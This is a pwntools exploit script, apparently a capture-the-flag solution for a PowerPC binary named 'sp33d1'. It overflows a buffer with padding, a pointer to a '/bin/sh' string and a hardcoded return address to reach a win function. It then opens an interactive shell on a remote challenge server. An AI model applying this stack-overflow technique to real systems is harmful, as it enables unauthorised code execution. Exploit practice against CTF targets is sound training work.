from pwn import *
import time

context.arch = 'powerpc'
#context.log_level = 'debug'

# First, close any existing processes using port 1234
os.system('pkill -f "qemu-ppc -g 1234"')

# Start QEMU with GDB server explicitly
cmd = ['qemu-ppc', '-g', '1234', './sp33d1']

#cmd = ['qemu-ppc', '-g', '1234', './sp33d1']
p = process(cmd)
p = remote("sp33d.play.hfsc.tf", 20020)

p.recvuntil(b"pwn: ")

ptr_to_bin_sh = 0x100bef28 - 8

# Craft payload
payload = b'A' * 20
payload += p32(ptr_to_bin_sh)
payload += b'AAAA'
payload += p32(0x10000610) # win+24

p.sendline(payload)

p.interactive()
